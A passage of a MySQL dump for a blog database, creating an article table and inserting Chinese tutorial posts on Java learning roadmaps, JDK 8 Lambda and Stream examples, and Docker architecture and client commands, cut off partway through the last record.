/*
 Navicat Premium Data Transfer

 Source Server         : demo-01
 Source Server Type    : MySQL
 Source Server Version : 50711
 Source Host           : localhost:3306
 Source Schema         : blog_system

 Target Server Type    : MySQL
 Target Server Version : 50711
 File Encoding         : 65001

 Date: 03/07/2021 11:47:23
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for t_article
-- ----------------------------
DROP TABLE IF EXISTS `t_article`;
CREATE TABLE `t_article`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '文章标题',
  `content` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL COMMENT '文章具体内容',
  `created` date NOT NULL COMMENT '发表时间',
  `modified` date NULL DEFAULT NULL COMMENT '修改时间',
  `categories` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '默认分类' COMMENT '文章分类',
  `tags` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '文章标签',
  `allow_comment` tinyint(1) NOT NULL DEFAULT 1 COMMENT '是否允许评论',
  `recommend` tinyint(1) NULL DEFAULT 0 COMMENT '是否为推荐',
  `thumbnail` varchar(200) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '文章缩略图',
  `userName` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '文章所属用户',
  `likes` int(11) NULL DEFAULT 0 COMMENT '文章点赞数',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 98 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of t_article
-- ----------------------------
INSERT INTO `t_article` VALUES (1, '2018新版Java学习路线图', '    播妞深知广大爱好Java的人学习是多么困难，没视频没资源，上网花钱还老担心被骗。因此专门整理了新版的学习路线图，不管你是不懂电脑的小白，还是已经步入开发的大牛，这套路线路绝对不容错过！12年传智播客黑马程序员分享免费视频教程长达10余万小时，累计下载量3000余万次，受益人数达千万。2018年我们不忘初心，继续前行。 路线图的宗旨就是分享，专业，便利，让喜爱Java的人，都能平等的学习。从今天起不要再找借口，不要再说想学Java却没有资源，赶快行动起来，Java等你来探索，高薪距你只差一步！\r\n\r\n**一、2018新版Java学习路线图---每阶段市场价值及可解决的问题**\r\n![alt](/article_img/roadmap/1.jpg)\r\n\r\n**二、2018新版Java学习路线图---学习大纲及各阶段知识点**\r\n![alt](/article_img/roadmap/2.jpg)\r\n\r\n![alt](/article_img/roadmap/3.jpg)\r\n\r\n**三、2018新版Java学习路线图---升级后新增知识点一览**\r\n![alt](/article_img/roadmap/4.jpg)\r\n\r\n\r\n\r\n', '2018-10-10', '2021-06-05', '默认分类', 'Java,学习路线图,2018', 1, 0, NULL, 'admin', 0);
INSERT INTO `t_article` VALUES (2, '2018新版Python学习线路图', '&ensp;&ensp;&ensp;&ensp;12年历经风雨，传智播客黑马程序员已免费分享视频教程长达10万余小时，累计下载量超2000万次，受益人数达千万。2018年我们不忘初心，继续前行。学习路线图的宗旨就是分享，专业，便利，让喜爱Python的人，都能平等的学习。据悉，Python已经入驻小学生教材，未来不学Python不仅知识会脱节，可能与小朋友都没有了共同话题~~所以，从今天起不要再找借口，不要再说想学Python却没有资源，赶快行动起来，Python等你来探索，高薪距你只差一步！\r\n\r\n**一、2018新版Python学习路线图---每阶段市场价值及可解决的问题**\r\n![alt](/article_img/phmap/1.jpg)\r\n\r\n![alt](/article_img/phmap/2.jpg)\r\n\r\n**二、2018新版Python学习路线图---学习大纲及各阶段知识点**\r\n![alt](/article_img/phmap/3.jpg)\r\n\r\n![alt](/article_img/phmap/4.jpg)\r\n\r\n**三、2018新版Python学习路线图---升级版Python成长路径**\r\n![alt](/article_img/phmap/5.jpg)\r\n\r\n![alt](/article_img/phmap/6.jpg)', '2018-10-24', NULL, '奔驰AMG', '2018,Python,学习线路图', 1, 0, NULL, 'admin', 0);
INSERT INTO `t_article` VALUES (3, '2018新版前端与移动开发学习线路图', '&ensp;&ensp;&ensp;&ensp;传智播客黑马程序员作为一个IT学习平台，历经12年的成长，免费分享视频教程长达10万余小时，累计下载量超3000万次，受益人数达千万。2018年我们不忘初心，继续前行！路线图的宗旨就是分享，专业，便利，让更多想要学习IT的人都能系统的学习！从今天起不要再找借口，不要再说想学却没有资源，赶快行动起来，前端与移动开发等你来探索，高薪距你只差一步！注：新版前端与移动开发学习大纲于2018年2月26日完成升级，本学习路线图依据最新升级后的规划制作！\r\n\r\n**一、2018新版前端与移动开发学习路线图---每阶段可掌握的能力及可解决的问题**\r\n![alt](/article_img/frmap/1.jpg)\r\n\r\n![alt](/article_img/frmap/2.jpg)\r\n\r\n**二、2018新版前端与移动开发学习路线图---学习大纲及各阶段知识点**\r\n![alt](/article_img/frmap/3.jpg)\r\n\r\n![alt](/article_img/frmap/4.jpg)\r\n\r\n**三、2018新版前端与移动开发学习路线图--升级后新增知识点设计理念**\r\n![alt](/article_img/frmap/5.jpg)', '2018-11-13', NULL, 'SpringBoot', '2018,前端与移动,学习线路图', 1, 0, NULL, 'admin', 0);
INSERT INTO `t_article` VALUES (5, '2018版Go语言+区块链学习线路图', '&ensp;&ensp;&ensp;&ensp;12年传智播客黑马程序员分享免费视频教程长达10万余小时，累计下载量超3000万次，受益人数达千万。2018年我们不忘初心，继续前行。 路线图的宗旨就是分享，专业，便利，让喜爱Go语言+区块链的人，都能平等的学习。从今天起不要再找借口，不要再说想学Go语言+区块链却没有资源，赶快行动起来，Go语言+区块链等你来探索，高薪距你只差一步！\r\n\r\n**一、2018新版Go语言+区块链学习路线图---每阶段市场价值及可解决的问题**\r\n![alt](/article_img/gomap/1.jpg)\r\n\r\n![alt](/article_img/gomap/2.jpg)\r\n\r\n**二、2018新版Go语言+区块链学习路线图---每阶段可掌握的核心能力**\r\n![alt](/article_img/gomap/3.jpg)\r\n\r\n**三、2018新版Go语言+区块链学习路线图---每阶段的设计理念**\r\n![alt](/article_img/gomap/4.jpg)\r\n\r\n**四、2018新版Go语言+区块链学习路线图---学习大纲及各阶段知识点**\r\n![alt](/article_img/gomap/5.jpg)\r\n\r\n![alt](/article_img/gomap/6.jpg)', '2019-01-18', NULL, 'Spring', '2018,Go语言,区块链,学习线路图', 1, 0, NULL, 'admin', 0);
INSERT INTO `t_article` VALUES (6, 'JDK 8——Lambda表达式介绍', '  Lambda表达式是JDK 8中一个重要的新特性，它使用一个清晰简洁的表达式来表达一个接口，同时Lambda表达式也简化了对集合以及数组数据的遍历、过滤和提取等操作。下面，本篇文章就对Lambda表达式进行简要介绍，并进行演示说明。\r\n\r\n**1. Lambda表达式入门**  \r\n\r\n  匿名内部类存在的一个问题是，如果匿名内部类的实现非常简单，例如只包含一个抽象方法的接口，那么匿名内部类的语法仍然显得比较冗余。为此，JDK 8中新增了一个特性Lambda表达式，这种表达式只针对有一个抽象方法的接口实现，以简洁的表达式形式实现接口功能来作为方法参数。  \r\n  一个Lambda表达式由三个部分组成，分别为参数列表、“->”和表达式主体，其语法格式如下：\r\n```js\r\n ([数据类型 参数名,数据类型 参数名,...]) -> {表达式主体}\r\n```  \r\n  从上述语法格式上看，Lambda表达式的书写非常简单，下面针对Lambda表达式的组成部分进行简单介绍，具体如下：  \r\n  （1）([数据类型 参数名,数据类型 参数名,...])：用来向表达式主体传递接口方法需要的参数，多个参数名中间必须用英文逗号“,”进行分隔；在编写Lambda表达式时，可以省略参数的数据类型，后面的表达式主体会自动进行校对和匹配；同时，如果只有一个参数，则可以省略括号“()”。  \r\n  （2）->：表示Lambda表达式箭牌，用来指定参数数据指向，不能省略，且必须用英文横线和大于号书写。  \r\n  （3）{表达式主体}：由单个表达式或语句块组成的主体，本质就是接口中抽象方法的具体实现，如果表达式主体只有一条语句，那么可以省略包含主体的大括号；另外，在Lambda表达式主体中允许有返回值，当只有一条return语句时，也可以省略return关键字。  \r\n  了解了Lambda表达式的语法后，接下来编写一个示例文件对Lambda表达式的基本使用进行介绍，具体代码如下所示。\r\n```js\r\n 1	// 定义动物类接口\r\n 2	interface Animal { \r\n 3		void shout(); // 定义方法shout()\r\n 4	}\r\n 5	public class Example22 {\r\n 6		public static void main(String[] args) {\r\n 7	       String name = \"小花\"; \r\n 8	       // 1、匿名内部类作为参数传递给animalShout()方法\r\n 9		  animalShout(new Animal() { \r\n 10				 public void shout() { \r\n 11				    System.out.println(\"匿名内部类输出：\"+name+\"喵喵...\");\r\n 12				}\r\n 13		  });\r\n 14		  // 2、使用Lambda表达式作为参数传递给animalShout()方法\r\n 15	       animalShout(()-> System.out.println(\"Lambda表达式输出：\"\r\n 16	                                                   +name+\"喵喵...\"));\r\n 17		}\r\n 18	    // 创建一个animalShout()静态方法，接收接口类型的参数\r\n 19		public static void animalShout(Animal an) {\r\n 20			an.shout();  \r\n 21		}\r\n 22	}\r\n```  \r\n  运行结果下图所示。\r\n![alt](/article_img/lambda/1.jpg)\r\n  上述代码示例中，先定义了只有一个抽象方法的接口Animal，然后分别使用匿名内部类和Lambda表达式的方式实现了接口方法。从图中可以看出，使用匿名内部类和Lambda表达式都能实现接口中方法，但很显然使用Lambda表达式更加简洁和清晰。', '2018-11-27', NULL, '默认分类', '2018,Lambda表达式', 1, 0, NULL, 'admin', 0);
INSERT INTO `t_article` VALUES (7, '函数式接口', '&emsp;&emsp;虽然Lambda表达式可以实现匿名内部类的功能，但在使用时却有一个局限，即接口中有且只有一个抽象方法时才能使用Lamdba表达式代替匿名内部类。这是因为Lamdba表达式是基于函数式接口实现的，所谓函数式接口是指有且仅有一个抽象方法的接口，Lambda表达式就是Java中函数式编程的体现，只有确保接口中有且仅有一个抽象方法，Lambda表达式才能顺利地推导出所实现的这个接口中的方法。  \r\n&emsp;&emsp;在JDK 8中，专门为函数式接口引入了一个@FunctionalInterface注解，该注解只是显示的标注了接口是一个函数式接口，并强制编辑器进行更严格的检查，确保该接口是函数式接口，如果不是函数式接口，那么编译器就会报错，而对程序运行并没有实质上的影响。  \r\n&emsp;&emsp;接下来通过一个案例来演示函数式接口的定义与使用，示例代码如下所示。\r\n```js\r\n 1	// 定义无参、无返回值的函数式接口\r\n 2	@FunctionalInterface\r\n 3	interface Animal {\r\n 4		void shout();\r\n 5	}\r\n 6	// 定义有参、有返回值的函数式接口\r\n 7	interface Calculate {\r\n 8		int sum(int a, int b);\r\n 9	}\r\n 10	public class Example23 {\r\n 11		public static void main(String[] args) {\r\n 12		   // 分别两个函数式接口进行测试\r\n 13		   animalShout(() -> System.out.println(\"无参、无返回值的函数式接口调用\"));\r\n 14		   showSum(10, 20, (x, y) -> x + y);\r\n 15		}\r\n 16		// 创建一个动物叫的方法，并传入接口对象Animal作为参数\r\n 17		private static void animalShout(Animal animal) {\r\n 18			animal.shout();\r\n 19		}\r\n 20		// 创建一个求和的方法，并传入两个int类型以及接口Calculate类型的参数\r\n 21		private static void showSum(int x, int y, Calculate calculate) {\r\n 22		   System.out.println(x + \"+\" + y + \"的和为：\" + calculate.sum(x, y));\r\n 23		}\r\n 24	}\r\n```  \r\n&emsp;&emsp;运行结果如下图所示。\r\n\r\n![alt](/article_img/lambda/2.jpg)\r\n&emsp;&emsp;上述代码示例中，先定义了两个函数式接口Animal和Calculate，然后在测试类中分别编写了两个静态方法，并将这两个函数式接口以参数的形式传入，最后在main()方法中分别调用这两个静态方法，并将所需要的函数式接口参数以Lambda表达式的形式传入。从图中可以看出，程序中函数式接口的定义和使用完全正确。\r\n', '2018-12-01', NULL, 'Spring', '接口,函数式接口', 1, 0, NULL, 'admin', 0);
INSERT INTO `t_article` VALUES (8, 'JDK 8——聚合操作', '&emsp;&emsp;在Java8版本中，JDK包含许多聚合操作（如平均值，总和，最小，最大，和计数），返回一个计算流stream的聚合结果。这些聚合操作被称为聚合操作。JDK除返回单个值的聚合操作外，还有很多聚合操作返回一个collection集合实例。很多的reduce操作执行特定的任务，如求平均值或按类别分组元素。  \r\n\r\n**1. 聚合操作简介**\r\n\r\n  在开发中，多数情况下会涉及到对集合、数组中元素的操作，在JDK 8之前都是通过普通的循环遍历出每一个元素，然后还会穿插一些if条件语句选择性的对元素进行查找、过滤、修改等操作，这种原始的操作方法虽然可行，但是代码量较大并且执行效率较低。  \r\n  为此，JDK 8中新增了一个Stream接口，该接口可以将集合、数组的中的元素转换为Stream流的形式，并结合Lambda表达式的优势来进一步简化集合、数组中元素的查找、过滤、转换等操作，这一新功能就是JDK 8中的聚合操作。  \r\n  在程序中，使用聚合操作没有绝对的语法规范，根据实际操作流程，主要可以分为以下3个步骤：  \r\n  （1）将原始集合或者数组对象转换为Stream流对象；  \r\n  （2）对Stream流对象中的元素进行一系列的过滤、查找等中间操作（Intermediate Operations），然后仍然返回一个Stream流对象；  \r\n  （3）对Stream流进行遍历、统计、收集等终结操作（Terminal Operation），获取想要的结果。  \r\n  接下来，就根据上面聚合操作的3个步骤，通过一个案例来演示聚合操作的基本用法，具体示例代码如下所示。\r\n```js\r\n 1	import java.util.*;\r\n 2	import java.util.stream.Stream;\r\n 3	public class Example31 {\r\n 4		public static void main(String[] args) {\r\n 5	          // 创建一个List集合对象\r\n 6			List<String> list = new ArrayList<>(); \r\n 7			list.add(\"张三\");\r\n 8			list.add(\"李四\");\r\n 9			list.add(\"张小明\");\r\n 10			list.add(\"张阳\");\r\n 11			// 1、创建一个Stream流对象\r\n 12			Stream<String> stream = list.stream();\r\n 13			// 2、对Stream流中的元素分别进行过滤、截取操作\r\n 14		       Stream<String> stream2 = stream.filter(i -> i.startsWith(\"张\"));\r\n 15			Stream<String> stream3 = stream2.limit(2);\r\n 16			// 3、对Stream流中的元素进行终结操作，进行遍历输出\r\n 17			stream3.forEach(j -> System.out.println(j));\r\n 18			System.out.println(\"=======\");\r\n 19	         // 通过链式表达式的形式完成聚合操作\r\n 20			list.stream().filter(i -> i.startsWith(\"张\"))\r\n 21						 .limit(2)\r\n 22						 .forEach(j -> System.out.println(j));\r\n 23		}\r\n 24	}\r\n``` \r\n   运行结果如下图所示。\r\n![alt](/article_img/lambda/3.jpg)\r\n  上述示例代码中，先创建了一个List集合，然后根据聚合操作的3个步骤实现了集合对象的聚合操作，对集合中的元素使用Stream流的形式进行过滤（filter）、截取（limit），并进行遍历输出。其中第12~17行代码分步骤详细展示了聚合操作，而第20~22行代码是使用了链式表达式（调用有返回值的方法时不获取返回值而是直接再调用另一个方法）实现了聚合操作，该表达式的语法格式更简洁、高效，这种链式调用也被称为操作管道流。\r\n\r\n**2. 创建Stream流对象**  \r\n  在上一小节中，介绍了聚合操作的主要使用步骤，其中首要解决的问题就是创建Stream流对象。聚合操作针对的就是可迭代数据进行的操作，如集合、数组等，所以创建Stream流对象其实就是将集合、数组等通过一些方法转换为Stream流对象。  \r\n  在Java中，集合对象有对应的集合类，可以通过集合类提供的静态方法创建Stream流对象，而数组数据却没有对应的数组类，所以必须通过其他方法创建Stream流对象。针对不同的源数据，Java提供了多种创建Stream流对象的方式，分别如下：  \r\n  （1）所有的Collections集合都可以使用stream()静态方法获取Stream流对象；  \r\n  （2）Stream接口的of()静态方法可以获取基本类型包装类数组、引用类型数组和单个元素的Stream流对象；  \r\n  （3）Arrays数组工具类的stream()静态方法也可以获取数组元素的Stream流对象。  \r\n  接下来，通过一个案例来学习聚合操作中如何创建Stream流对象，具体示例代码如下所示。\r\n```js\r\n 1	import java.util.*;\r\n 2	import java.util.stream.Stream;\r\n 3	public class Example32 {\r\n 4		public static void main(String[] args) {\r\n 5	          // 创建一个数组\r\n 6			Integer[] array = { 9, 8, 3, 5, 2 };       \r\n 7	          // 将数组转换为List集合\r\n 8			List<Integer> list = Arrays.asList(array); \r\n 9			// 1、使用集合对象的stream()静态方法创建Stream流对象\r\n 10			Stream<Integer> stream = list.stream();\r\n 11			stream.forEach(i -> System.out.print(i+\" \"));\r\n 12			System.out.println();\r\n 13			// 2、使用Stream接口的of()静态方法创建Stream流对象\r\n 14			Stream<Integer> stream2 = Stream.of(array);\r\n 15			stream2.forEach(i -> System.out.print(i+\" \"));\r\n 16			System.out.println();\r\n 17			// 3、使用Arrays数组工具类的stream()静态方法创建Stream流对象\r\n 18			Stream<Integer> stream3 = Arrays.stream(array);\r\n 19			stream3.forEach(i -> System.out.print(i+\" \"));\r\n 20		}\r\n 21	}\r\n```  \r\n  运行结果如下图所示。\r\n![alt](/article_img/lambda/4.jpg)\r\n  上述示例代码中，先创建了一个数组和一个集合，然后通过三种方式实现了Stream流对象的创建，并通过Stream流对象的forEach()方法结合Lambda表达式完成了集合和数组中元素的遍历。  \r\n\r\n**小提示：**  \r\n  在JDK 8中，只针对单列集合Collections接口对象提供了stream()静态方法获取Stream流对象，并未对Map集合提供相关方法获取Stream流对象，所以想要用Map集合创建Stream流对象必须先通过Map集合的keySet()、values()、entrySet()等方法将Map集合转换为单列Set集合，然后再使用单列集合的stream()静态方法获取对应键、值集合的Stream流对象。\r\n\r\n', '2019-03-23', NULL, '默认分类', 'JDK 8,聚合操作', 1, 0, NULL, 'admin', 0);
INSERT INTO `t_article` VALUES (9, '虚拟化容器技术——Docker运行机制介绍', '  Docker是一个开源的应用容器引擎，它基于go语言开发，并遵从Apache2.0开源协议。使用Docker可以让开发者封装他们的应用以及依赖包到一个可移植的容器中，然后发布到任意的Linux机器上，也可以实现虚拟化。Docker容器完全使用沙箱机制，相互之间不会有任何接口，这保证了容器之间的安全性。  \r\n\r\n**1. Docker的引擎介绍**\r\n\r\n  Docker Engine（Docker引擎）是Docker的核心部分，使用的是客户端-服务器（C/S）架构模式，其主要组成部分如下图所示。\r\n![alt](/article_img/docker/1.png)\r\n  从上图可以看出，Docker Engine中包含了三个核心组件（docker CLI、REST API和docker daemon），这三个组件的具体说明如下：  \r\n  ①docker CLI（command line interface）：表示Docker命令行接口，开发者可以在命令行中使用Docker相关指令与Docker守护进程进行交互，从而管理诸如image（镜像）、container（容器）、network（网络）和data volumes（数据卷）等实体。  \r\n  ②REST API：表示应用程序API接口，开发者通过该API接口可以与Docker的守护进程进行交互，从而指示后台进行相关操作。  \r\n  ③docker daemon：表示Docker的服务端组件，他是Docker架构中运行在后台的一个守护进程，可以接收并处理来自命令行接口及API接口的指令，然后进行相应的后台操作。  \r\n  对于开发者而言，既可以使用编写好的脚本文件通过REST API来实现与Docker进程交互，又可以直接使用Docker相关指令通过命令行接口来与Docker进程交互，而其他一些Docker应用则是通过底层的API和CLI进行交互的。\r\n\r\n**2. Docker的架构介绍**\r\n\r\n  了解了Docker内部引擎及作用后，我们还需要通过Docker的具体架构，来了解Docker的整个运行流程。接下来借助Docker官网的架构图来对Docker架构进行详细说明，如下图所示。\r\n![alt](/article_img/docker/2.jpg)\r\n  从图中可以看出，Docker架构主要包括Client、DOCKER_HOST和Register三部分，关于这三部分的具体说明如下。  \r\n&emsp;&emsp;**（1）Client（客户端）**  \r\n  Client即Docker客户端，也就是上一小节Docker Engine中介绍的docker CLI。开发者通过这个客户端使用Docker的相关指令与Docker守护进程进行交互，从而进行Docker镜像的创建、拉取和运行等操作。  \r\n&emsp;&emsp;**（2）DOCKER_HOST（Docker主机）**  \r\n  DOCKER_HOST即Docker内部引擎运行的主机，主要指Docker daemon（Docker守护进程）。可以通过Docker守护进程与客户端还有Docker的镜像仓库Registry进行交互，从而管理Images（镜像）和Containers（容器）等。  \r\n&emsp;&emsp;**（3）Registry（注册中心）**  \r\n  Registry即Docker注册中心，实质就是Docker镜像仓库，默认使用的是Docker官方远程注册中心Docker Hub，也可以使用开发者搭建的本地仓库。Registry中包含了大量的镜像，这些镜像可以是官网基础镜像，也可以是其他开发者上传的镜像。  \r\n  我们在实际使用Docker时，除了会涉及到图中的三个主要部分外，还会涉及到很多Docker Objects（Docker对象），例如Images（镜像）、Containers（容器）、Networks（网络）、Volumes（数据卷）、Plugins（插件）等。其中常用的两个对象Image和Containers的说明如下。  \r\n  ①Images（镜像）  \r\n  Docker 镜像就是一个只读的模板，包含了一些创建Docker容器的操作指令。通常情况下，一个Docker镜像是基于另一个基础镜像创建的，并且新创建的镜像会额外包含一些功能配置。例如：开发者可以依赖于一个Ubuntu的基础镜像创建一个新镜像，并可以在新镜像中安装Apache等软件或其它应用程序。  \r\n  ②Containers（容器）  \r\n  Docker容器属于镜像的一个可运行实例（镜像与容器的关系其实与Java中的类与对象相似），开发者可以通过API接口或者CLI命令行接口来创建、运行、停止、移动、删除一个容器，也可以将一个容器连接到一个或多个网络中，将数据存储与容器进行关联。\r\n\r\n\r\n\r\n', '2018-12-03', NULL, '默认分类', '虚拟化容器,Docker,运行机制', 1, 0, NULL, '李四', 0);
INSERT INTO `t_article` VALUES (10, 'Docker常用客户端指令介绍', '  在使用Docker之前，首先会为对应的项目编写Dockerfile镜像构建文件，然后通过Docker的相关指令进行镜像构建，完成镜像的构建后，就可以使用这些项目镜像进行启动测试了。所以要想知道如何使用Docker来执行这些Dockerfile镜像构建文件，还需要学习Docker客户端的常用指令，本篇文章将对Docker客户端的常用指令进行详细讲解。  \r\n\r\n**1.列出镜像**  \r\n  通过docker images指令可以查看本地镜像列表中已有的镜像，具体使用方式如下。\r\n```js\r\n$ docker images\r\n```  \r\n  执行上述指令后，系统会将所有本地镜像都展示出来，如下图所示。\r\n![alt](/article_img/docker/3.png)\r\n  从图中可以看出，系统终端将本地镜像列表中的3个镜像分5列进行了展示，每一列的具体含义如下。  \r\n  ●REPOSITORY：镜像名称。  \r\n  ●TAG：镜像的参数，类似于版本号，默认是latest。  \r\n  ●IMAGE ID：镜像ID，是唯一值。此处看到的是一个长度为12的字符串，实际上它是64位完整镜像ID的缩写形式。  \r\n  ●CREATED：距今创建镜像的时间。  \r\n  ●SIZE：镜像大小。    \r\n\r\n**2.搜索镜像**  \r\n  想知道在Docker Hub中包含了哪些镜像，除了可以登录Docker Hub，在官网中心进行查看外，还可以直接在Docker客户端进行查询。例如想要查询Ubuntu镜像，可以使用如下指令。\r\n```js\r\n$ docker search ubuntu\r\n```  \r\n  执行上述指令后，系统终端就会将搜索到的有关Ubuntu的镜像展示出来，如下图所示。\r\n![alt](/article_img/docker/4.png)\r\n  从图所示的结果可以看出，系统终端分5列将搜索到的Ubuntu相关镜像都列举出来了，这5列的具体含义如下。  \r\n  ●NAME：表示镜像的名称，这里有两种格式的名称，其中不带有“/”的表示官方镜像，而带有“/”的表示其他用户的公开镜像。公开镜像“/”前面是用户在Docker Hub上的用户名（唯一），后面是对应的镜像名；官方镜像与用户镜像，除了从镜像名称上可以区分外，还可以通过第4列的OFFICIAL声明中看出（该列下内容为OK表示官方镜像）。  \r\n  ●DESCRIPTION：表示镜像的描述，这里只显示了一小部分。  \r\n  ●STARS：表示该镜像的收藏数，用户可以在Docker Hub上对镜像进行收藏，一般可以通过该数字反应出该镜像的受欢迎程度。  \r\n  ●OFFICIAL：表示是否为官方镜像。  \r\n  ●AUTOMATED：表示是否自动构建镜像。例如，用户可以将自己的Docker Hub绑定到如Github上，当代码提交更新后，可以自动构建镜像。   \r\n \r\n**3.拉取镜像**  \r\n  通过docker pull指令可以拉取仓库镜像到本地（默认都是拉取Docker Hub仓库镜像，也可以指定“IP+端口”拉取某个Docker机器上的私有仓库镜像），具体使用方式如下。\r\n```js\r\n$ docker pull ubuntu\r\n```  \r\n  执行上述指令后，Docker会自动从Docker Hub上下载最新版本的Ubuntu到本地，当然也可以使用以下指令拉取指定版本的镜像到本地，具体指令如下。\r\n```js\r\n$ docker pull ubuntu:14.04\r\n```  \r\n**4.构建镜像**  \r\n  除了可以通过docker pull指令从仓库拉取镜像外，还可以通过docker build指令构建Docker镜像，通常情况下都是通过Dockerfile文件来构建镜像的。  \r\n  这里假设linux系统home目录下/shitou/workspace/dockerspace文件夹中编写有对应的Dockerfile文件，则构建镜像直立示例如下所示。 \r\n```js\r\n$ docker build -t hellodocker3 /home/shitou/workspace/dockerspace/.\r\n```\r\n**5.删除镜像**  \r\n  当本地存放过多不需要的镜像时，可以通过docker rmi指令将其删除。在删除镜像时，需要指定镜像名称或镜像ID。删除镜像的使用方式如下。\r\n```js\r\n$ docker rmi -f hellodocker2 hellodocker3\r\n```  \r\n  上述指令中，docker rmi表示删除镜像，-f表示进行强制删除，而hellodocker2和hellodocker3分别表示需要删除的镜像名称，这里同时删除两个镜像。除了根据名称删除镜像外，还也可以根据镜像ID来删除镜像，只是这里如果指定了删除ID为23c617a866d4的镜像后，会同时删除hellodocker、hellodocker2和hellodocker3三个镜像。  \r\n  需要特别强调的是，在进行镜像删除操作时，如果是通过镜像ID进行镜像删除，那么由该镜像创建的容器必须提前删除或停止。另外，在通过镜像名称操作镜像时，如果出现镜像重名的情况，必须在镜像名称后面指定镜像标签tag参数来确保唯一性。\r\n\r\n**6.创建并启动容器**  \r\n  Docker镜像主要用于创建容器，可以使用docker run指令创建并启动容器，具体使用方式如下。\r\n```js\r\n$ docker run -d -p 5000:80 --name test hellodocker\r\n```  \r\n  上述创建并启动容器的指令略微复杂，具体分析如下。  \r\n  ●docker run：表示创建并启动一个容器，而后面的hellodocker就表示要启动运行的镜像名称；  \r\n  ●-d：表示容器启动时在后台运行；  \r\n  ●-p 5000:80：表示将容器内暴露的80端口映射到宿主机指定的5000端口，也可以将-p 5000:80更改为-P来映射主机的随机端口（注意p字母的大小写）；  \r\n  ●--name test：表示为创建后的容器指定名称为test，如果没有该参数配置，则生成的容器会设置一个随机名称。  \r\n  docker run命令是Docker操作中较为复杂的一个，它可以携带多个参数和参数，我们可以通过docker run --help指令进行查看，其中有些参数如-e、-v和-w等都可以在Dockerfile文件中预先声明。 \r\n \r\n**7.列出容器**  \r\n  生成容器后，可以通过docker ps指令查看当前运行的所有容器，具体使用方式如下。\r\n```js\r\n$ docker ps\r\n```  \r\n  执行上述命令后，会将所有当前运行的容器都展示出来，具体如下图所示。\r\n![alt](/article_img/docker/5.png)\r\n  从图中可以看出，系统终端通过7列对当前的正在运行的一个容器进行了展示，图中每一列的具体含义如下。  \r\n  ●CONTAINER ID：表示生成的容器ID；  \r\n  ●IMAGE：表示生成该容器的镜像名称；  \r\n  ●COMMAND：表示启动容器时运行的命令，Docker要求在启动容器时必须运行一个命令；  \r\n  ●CREATED：表示容器创建的时间；  \r\n  ●STATUS：表示容器运行状态，例如Up表示运行中，Exited表示已停止；  \r\n  ●PORTS：表示容器内部暴露的端口映射到主机的端口；  \r\n  ●NAMES：表示生成容器的名称，由Docker引擎自动生成，可以像上述示例中使用--name参数指定生成容器的名称。  \r\n  另外，docker ps指令运行过程中可以指定多个参数，还可以通过docker ps --help指令对ps指令的其他信息进行查看。\r\n\r\n**8.删除容器**  \r\n  当不需要使用容器时，则可以使用docker rm指令删除已停止的容器，具体使用方式如下。\r\n```js\r\n$ docker rm f0c9a8b6e8c5\r\n```  \r\n  需要注意的是，上述指令只能删除已经停止运行的容器，而不能删除正在运行的容器。如果想要删除正在运行的容器，则需要添加-f参数强制删除，具体使用方式如下。\r\n```js\r\n$ docker rm -f f0c9a8b6e8c5\r\n```  \r\n  当需要删除的容器过多时，如果还一个个的删除就略显麻烦了，此时可以通过如下指令将全部容器删除。\r\n```js\r\n$ docker rm -f $(docker ps -aq)\r\n```  \r\n  上述指令中，首先会通过$(docker ps -aq)获取所有容器的ID，然后通过docker rm -f指令进行强制删除。如果开发者有自己特殊的删除需求，可以根据前面docker ps指令进行组装来获取需要删除的容器ID。  \r\n  Docker提供的操作指令远不止这些，这里就不一一列举了，想要了解更多Docker的操作指令，可以通过docker --help指令进行查看。\r\n\r\n\r\n', '2020-02-16', '2021-06-12', '默认分类', 'Docker,客户端指令', 1, 1, NULL, '李四', 0);
INSERT INTO `t_article` VALUES (11, 'Docker数据管理介绍', '  当我们对容器进行相关操作时，产生的一系列数据都会存储在容器中，而Docker内部又是如果管理这些数据的呢？本篇文章将针对Docker数据管理的一些知识进行介绍。\r\n  \r\n**1. Docker数据存储机制**  \r\n  使用Docker时，我们操作的都是镜像和由镜像生成的容器，所以想要更好的了解Docker内部的数据存储机制，就必须从镜像、容器与数据存储的关系出发。  \r\n  Docker镜像是通过读取Dockerfile文件中的指令构建的，Dockerfile中的每条指令都会创建一个镜像层，并且每层都是只读的，这一系列的镜像层就构成了Docker镜像。接下来以一个Dockerfile文件为例进行说明，具体如下列代码示例所示。\r\n```js\r\n 1	FROM ubuntu:16.04\r\n 2	COPY . /app\r\n 3	RUN make /app\r\n 4	CMD python /app/app.py\r\n```  \r\n   上述文件示例中的Dockerfile包含了4条指令，每条指令都会创建一个镜像层，其中每一层与前一层都有所不同，并且是层层叠加的。通过镜像构建容器时，会在镜像层上增加一个容器层（即可写层），所有对容器的更改都会写入容器层，这也是Docker默认的数据存储方式。  \r\n  下面通过一个效果图进行说明，具体如下图所示。\r\n![alt](/article_img/docker/6.png)\r\n  从图中可以看出，Docker容器和镜像之间的主要区别是顶部的容器层，而所有对容器中数据的添加、修改等操作都会被存储在容器层中。当容器被删除时，容器层也会被删除，其中存储的数据会被一同删除，而下面的镜像层却保持不变。  \r\n  由于所有的容器都是通过镜像构建的，所以每个容器都有各自的容器层，对于容器数据的更改就会保存在各自的容器层中。也就是说，由同一个镜像构建的多个容器，它们会拥有相同的底部镜像层，而拥有不同的容器层，多个容器可以访问相同的镜像层，并且有自己的独立数据状态。具体说明如下图所示。 \r\n![alt](/article_img/docker/7.png)\r\n  从图中可以看出，基于同一个镜像构建的多个容器可以共享该镜像层，但是多个容器想要共享相同的数据，就需要将这些数据存储到容器之外的地方，而这种方式就是下一节要提到的Docker volume数据外部挂载机制。  \r\n\r\n**2. 